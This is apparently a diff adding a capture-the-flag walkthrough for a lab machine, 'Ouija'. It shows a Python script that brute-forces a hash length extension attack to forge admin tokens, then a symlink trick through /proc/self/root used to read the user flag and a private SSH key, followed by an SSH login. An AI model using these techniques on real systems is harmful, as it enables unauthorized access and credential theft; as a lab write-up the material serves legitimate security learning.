@@ -370,3 +370,95 @@ exit 1
 `init.sh` is an initalization script that sets up an API configuration. It sets two environment variables - `k` (an api key) and `botauth_id` (credentials to be used for identification), and another environment variable that resembles an SHA265 hash. `k`, `botauth_id` are likely to be input to the `generate_cookie` function in `app.js`, and `hash` is its output. Essentially, `hash = sha256(key||botauth_id)`. We can use this in a Hash Length Extension attack to create a hash that gives us admin privileges - `sha256(key||botauth_id||::admin:True)`.
 
 # STEP 5 - Hash Length Extension Attack
+We will use [Hash_Extender](https://github.com/iagox86/hash_extender/blob/master/README.md) to generate the identification and ihash string we need. But, first we need to find the length of the secret key. To do that, we wrote the following script, which runs hash_extender with all possible lengths and sends a request to the server, until one of them works:
+
+```python
+import base64
+import requests
+import subprocess
+
+'''
+Input: identification string, ihash string
+Process: make a request to ouija.htb:3000 with the identification and ihash headers
+Output: False if the server responded with "Invalid Token", and True otherwise
+'''
+def req(identification, ihash):
+    headers = {
+        'Host': '10.10.11.244:3000',
+        'ihash': ihash,
+        'identification': identification
+    }
+
+    res = requests.get("http://ouija.htb:3000/users", headers=headers).text
+
+    if "Invalid Token" not in res:
+        return True
+    else:
+        return False
+        
+
+
+'''
+Input: data string, append string, original hash string, and secret length
+Process: runs the hash_extender tool with the given parameters, then finds the new hash string in the output
+Output: new hash string
+'''
+def extend(data, append, original_hash, secret_length):
+    res = subprocess.run(f"./hash_extender -d '{data}' -a '{append}' -f sha256 -s '{original_hash}' -l {secret_length}", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
+    res_array = res.stdout.strip().split()
+    result = [res_array[7], res_array[10]]
+    return result
+
+
+'''
+Main:
+'''
+data = 'bot1:bot'
+original_hash = '4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1'
+append = '::admin:True'
+secret_length = 1
+found = False
+
+while not found:
+    #run hash_extender and keep the results in vars
+    extender_output_arr = extend(data, append, original_hash, secret_length)
+    ihash = extender_output_arr[0]
+    identification = base64.b64encode(extender_output_arr[1].encode('utf-8')).decode('utf-8')
+
+    #make the request
+    found = req(identification, ihash)
+
+    if found:
+        print(f'FOUND:\nihash: {ihash}\nidentification: {identification}\nsecret lenght: {secret_length}')
+    else:
+        print(f'WRONG:\nihash: {ihash}\nidentification: {identification}\nsecret lenght: {secret_length}')
+        secret_length += 1
+```
+
+After running the script we have the values of the `ihash` and `identification` headers that will give us admin privileges for the app running on port 3000!
+
+```bash
+┌─[✗]─[dana404@parrot]─[~/Documents/tmp/ouija/hash_extender]
+└──╼ $python3 secret-length.py
+WRONG:
+ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b
+identification: NjI2Zjc0MzEzYTYyNmY3NDgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDQ4M2EzYTYxNjQ2ZDY5NmUzYTU0NzI3NTY1
+secret lenght: 1
+WRONG:
+ihash: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b
+identification: NjI2Zjc0MzEzYTYyNmY3NDgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDA1MDNhM2E2MTY0NmQ2OTZlM2E1NDcyNzU2NQ==
+secret lenght: 2
+...SNIP...
+FOUND:
+ihash: <VALUE>
+identification: <VALUE>
+secret lenght: <VALUE>
+```
+
+Now we can make request to `http://<TARGET>:3000?file=<FILENAME>` to view files on the server. We could abuse this to get Local File Inclusion (LFI), however, as can be seen in `app.js` the server doesn't allow request that contain charcters needed for Path Traversal. So we need to use another approach - in `init.sh` a symlink is created between `.config/bin/process_information` (which is in a directory accessible with the `file` parameter) to `/proc`. Interestingly, /proc/self/root is soft linked to the contents of the root directory as seen by the process. It would contain files such as `/bin`, `/etc`, and most importantly `/home`! So we tried our luck to access `.config/bin/process_informations/self/root/home/leila/user.txt` and found the user flag there!
+
+We looked for other interesting files in the home directory, which is how we found leila's private SSH key at `.config/bin/process_informations/self/root/home/leila/.ssh/id_rsa`! This allows us to SSH to the target with the following command:
+
+```bash
+ssh -i id_rsa leila@<TARGET>
+```
